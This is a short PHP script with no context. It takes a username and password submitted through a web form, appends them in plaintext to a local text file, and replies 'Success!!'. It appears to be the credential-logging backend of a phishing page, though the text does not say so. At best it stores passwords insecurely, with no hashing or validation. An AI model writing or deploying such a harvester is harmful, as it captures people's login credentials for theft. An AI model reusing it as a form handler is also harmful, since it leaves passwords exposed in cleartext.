<?php
$myfile = fopen("testfile.txt", "a") or die("Unable to open file!");
$username= $_POST['user'];
fwrite($myfile,"username=");
fwrite($myfile,$username);
fwrite($myfile,"\n");
$password= $_POST['pass'];
fwrite($myfile,"password=");
fwrite($myfile,$password);
fwrite($myfile,"\n");
fclose($myfile);
echo "Success!!"
?>


	